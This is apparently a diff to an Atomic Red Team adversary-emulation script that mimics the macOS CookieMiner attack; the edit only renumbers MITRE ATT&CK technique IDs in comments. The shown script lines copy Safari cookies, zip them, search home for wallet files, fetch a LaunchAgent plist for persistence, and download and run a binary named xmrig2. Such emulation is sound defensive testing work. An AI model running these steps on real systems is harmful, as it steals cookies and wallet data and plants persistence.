@@ -15,11 +15,11 @@ mkdir ${OUTPUT}
 cp Cookies.binarycookies ${OUTPUT}/Cookies.binarycookies
 
 #   Tactic: Exfiltration
-#   Technique: T1002 - Data Compressed
+#   Technique: T1560.002 - Archive Collected Data: Archive via Library
 zip -r interestingsafaricookies.zip ${OUTPUT}
 
 #   Tactic: Exfiltration
-#   Technique: T1048 - Exfiltration Over Alternative Protocol
+#   Technique: T1048.002 - Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
 #   Simulate network connection for exfiltration
 curl https://atomicredteam.io > /dev/null
 
@@ -31,7 +31,7 @@ find ~ -name "*wallet*" > interestingfiles.txt
 cp interestingfiles.txt ${OUTPUT}/interestingfiles.txt
 
 #   Tactic: Persistence
-#   Technique: T1159 - Launch Agent
+#   Technique: T1543.001 - Create or Modify System Process: Launch Agent
 mkdir -p ~/Library/LaunchAgents
 cd ~/Library/LaunchAgents
 curl --silent -o com.apple.rig2.plist https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/cookie-miner-payload-launchagent.plist
@@ -44,6 +44,6 @@ cd /Users/Shared
 curl --silent -o xmrig2 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello.macos
 
 #   Tactic: Defense Evasion
-#   Technique: T1222 - File Permissions Modification
+#   Technique: T1222.002 - File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
 chmod +x ./xmrig2
 ./xmrig2
